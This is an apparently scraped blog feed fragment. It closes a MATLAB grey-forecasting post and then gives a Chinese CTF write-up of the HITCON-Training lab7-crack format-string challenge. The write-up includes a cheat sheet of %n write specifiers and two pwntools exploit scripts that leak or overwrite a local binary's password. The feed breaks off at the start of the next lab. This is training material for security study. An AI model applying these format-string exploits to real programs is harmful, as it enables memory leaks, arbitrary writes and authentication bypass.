punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs<span class="token punctuation">,</span>yn<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'单调递增'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'实测值'</span><span class="token punctuation">,</span><span class="token string">'预测值'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'百分绝对误差为：'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'预测值为： '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%递减</span>y1<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x1<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n1<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y1<span class="token punctuation">)</span><span class="token punctuation">;</span>yy1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    <span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT1<span class="token operator">=</span>B1<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token number">-1</span>    <span class="token function">YN1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN1<span class="token operator">=</span>YN1<span class="token operator">'</span><span class="token punctuation">;</span>A1<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT1<span class="token operator">*</span>B1<span class="token punctuation">)</span><span class="token operator">*</span>BT1<span class="token operator">*</span>YN1<span class="token punctuation">;</span>a1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t1<span class="token operator">=</span>u1<span class="token operator">/</span>a1<span class="token punctuation">;</span>t_test1<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%需要预测个数</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test1<span class="token operator">+</span>n1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a1<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n1<span class="token operator">+</span>t_test1<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x21<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token punctuation">;</span>xs1<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">;</span>yn1<span class="token operator">=</span><span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">;</span>det1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    det1<span class="token operator">=</span>det1<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det1<span class="token operator">=</span>det1<span class="token operator">/</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs1<span class="token punctuation">,</span>yn1<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'单调递增'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'实测值'</span><span class="token punctuation">,</span><span class="token string">'预测值'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'百分绝对误差为：'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'预测值为： '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys1</span><span class="token punctuation">(</span>n1<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%整个区间</span>y2<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x2<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n2<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y2<span class="token punctuation">)</span><span class="token punctuation">;</span>yy2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    <span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT2<span class="token operator">=</span>B2<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token number">-1</span>    <span class="token function">YN2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN2<span class="token operator">=</span>YN2<span class="token operator">'</span><span class="token punctuation">;</span>A2<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT2<span class="token operator">*</span>B2<span class="token punctuation">)</span><span class="token operator">*</span>BT2<span class="token operator">*</span>YN2<span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t2<span class="token operator">=</span>u2<span class="token operator">/</span>a2<span class="token punctuation">;</span>t_test2<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%需要预测个数</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test2<span class="token operator">+</span>n2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t2<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a2<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n2<span class="token operator">+</span>t_test2<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x22<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token punctuation">;</span>xs2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">;</span>yn2<span class="token operator">=</span><span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">;</span>det2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    det2<span class="token operator">=</span>det2<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det2<span class="token operator">=</span>det2<span class="token operator">/</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs2<span class="token punctuation">,</span>yn2<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'全区间'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'实测值'</span><span class="token punctuation">,</span><span class="token string">'预测值'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'百分绝对误差为：'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'预测值为： '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys2</span><span class="token punctuation">(</span>n2<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>原运行效果：</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e4f895b1.png" alt=""></p><p>将函数改为 y = sin(x) 后发现预测效果不大，这是因为灰色预测比较适用于单调函数而非波动性比较大的函数，因为这种波动会被视为干扰消除。</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e005249b.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;灰色预测（Grey-model）&quot;&gt;&lt;a href=&quot;#灰色预测（Grey-model）&quot; class=&quot;headerlink&quot; title=&quot;灰色预测（Grey model）&quot;&gt;&lt;/a&gt;灰色预测（Grey model）&lt;/h1&gt;&lt;blo
      
    
    </summary>
    
      <category term="算法" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
    
      <category term="算法" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="数学模型" scheme="http://www.yof3ng.xyz/tags/%E6%95%B0%E5%AD%A6%E6%A8%A1%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月26-Hitcon-四</title>
    <link href="http://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/"/>
    <id>http://www.yof3ng.xyz/2018/10/26/Pwn-10月26-Hitcon-四/</id>
    <published>2018-10-26T05:21:15.000Z</published>
    <updated>2018-10-26T09:07:16.750Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月26-Hitcon-四"><a href="#Pwn-10月26-Hitcon-四" class="headerlink" title="Pwn-10月26-Hitcon-四"></a>Pwn-10月26-Hitcon-四</h1><blockquote><p>练习Hitcon的第四天🐷，愉快地学习fsb（Format string bug），格式化字符串漏洞。</p></blockquote><h2 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h2><blockquote><p>好👍，这题开始接触格式化字符串漏洞。</p><p>什么是格式化字符串漏洞？我们知道c/c++中<code>printf</code>函数输出值需要对应的参数，但当提供的参数出现问题，或者没有提供参数的时候，格式化字符串漏洞就可能出现了。<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/#_6" target="_blank" rel="noopener">CTF-wiki传送门</a></p><p>那么假设，此时我们在编写程序时候，写成了下面的样子</p><pre><code>printf(&quot;Color %s, Number %d, Float %4.2f&quot;);</code></pre><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ol><li><strong>解析其地址对应的字符串</strong></li><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值</li></ol><p>由此可见<a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">格式化字符串漏洞</a>主要是：</p><ul><li><p><strong>1.泄漏任意地址的值，leak内存（比如leak出libc基地址）</strong></p></li><li><p><strong>2.写任意地址，可用于修改got表</strong></p></li></ul></blockquote><pre class=" language-bash"><code class="language-bash">这部分来自icemakr的博客 <span class="token operator">==</span><span class="token operator">></span>向大佬致敬32位读<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 读4个字节<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 同上面<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>写<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 解引用，写入四个字节<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // 解引用，写入两个字节<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入一个字节<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入八个字节64位读<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>      // 读4个字节<span class="token string">'%{}<span class="token variable">$lx</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>     // 读8个字节<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 读8个字节<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>写<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 解引用，写入四个字节<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // 解引用，写入两个字节<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入一个字节<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入八个字节%1<span class="token variable">$lx</span><span class="token keyword">:</span> RSI%2<span class="token variable">$lx</span><span class="token keyword">:</span> RDX%3<span class="token variable">$lx</span><span class="token keyword">:</span> RCX%4<span class="token variable">$lx</span><span class="token keyword">:</span> R8%5<span class="token variable">$lx</span><span class="token keyword">:</span> R9%6<span class="token variable">$lx</span><span class="token keyword">:</span> 栈上的第一个QWORD</code></pre><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>按套路来，先<code>checksec crack</code>:</p><p><img src="https://i.loli.net/2018/10/26/5bd2aa6e80564.png" alt=""></p><p>可以看到开启了栈溢出保护(canary found)，以及栈不可执行(NX)措施，很明显让我们从别处入手。</p><p>简单运行一下：</p><p><img src="https://i.loli.net/2018/10/26/5bd2aacec0ef5.png" alt=""></p><p>我们需要输入两个值，一个是name，输入之后会被打印，一个是password。</p><p><a href="http://m4x.fun/post/hitcon-training-writeup/#lab7-crack" target="_blank" rel="noopener">m4x师傅</a>的逻辑：<code>输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts_got 到 system(“cat flag”) 处（注意这里 printf 实际调用了 puts）</code>。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>idapro启动！！启动！！给我启动啊！！🙃！main函数：</p><p><img src="https://i.loli.net/2018/10/26/5bd2ac48e9124.png" alt=""></p></blockquote><h4 id="exp1：通过格式化字符串漏洞泄露password"><a href="#exp1：通过格式化字符串漏洞泄露password" class="headerlink" title="exp1：通过格式化字符串漏洞泄露password"></a>exp1：通过格式化字符串漏洞泄露password</h4><blockquote><p><img src="https://i.loli.net/2018/10/26/5bd2b96d60a25.png" alt=""></p><p>简单测试一下我们可以看到一些有趣的东西，这些应该是<code>printf</code>栈中的数据，那么我们只要找到栈中存储我们输入的内容的位置，假如输入的是某地址，再用%s解析就可获得该地址下的内容：</p><p><img src="https://i.loli.net/2018/10/26/5bd2bb34567e1.png" alt=""></p><p><img src="https://i.loli.net/2018/10/26/5bd2c986ab76f.png" alt=""></p><p>可以看到输入的内容在栈中的第十个位置，至于为什么在gdb看栈中数据在第十一个位置，是因为”Hello ,”还没有被输出，待其输出后我们的输入就来到了第十个位置。</p><p>这里学到一个小知识，<code>%10$s</code>中格式化字符串的“$”操作符，其允许我们从格式化字符串中选取一个位置的参数作为特定的参数。我们可以从IDA中得到<code>password_addr=0x804A080</code>，然后构造EXP。</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2scontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>pwd_addr<span class="token operator">=</span> <span class="token number">0x804A048</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' ?'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwd_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"|%10$x||"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#drop = True 表示丢弃pattern，不接受pattern</span>pwd <span class="token operator">=</span> str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">,</span>drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/26/5bd2bd871ce46.png" alt=""></p><h4 id="exp2：修改随机数"><a href="#exp2：修改随机数" class="headerlink" title="exp2：修改随机数"></a>exp2：修改随机数</h4><blockquote><p>简单了解fmtstr之后，知道原来还有这么骚的pwntools模块，这里简单对这个exp做个分析理解。</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#来自Veritas501大佬的exp</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>p_pwd <span class="token operator">=</span> <span class="token number">0x0804A048</span>fmt_len <span class="token operator">=</span> <span class="token number">10</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>fmt_len<span class="token punctuation">,</span><span class="token punctuation">{</span>p_pwd<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果:</p><p><img src="https://i.loli.net/2018/10/26/5bd2c4a2645c3.png" alt=""></p><h2 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h2><blockquote><p>这也是一题格式化字符串漏洞😄，我们可以直接通过类似上面题exp2的方式来修改值达到目的。</p></blockquote><h3 id="检查保护措施-1"><a href="#检查保护措施-1" 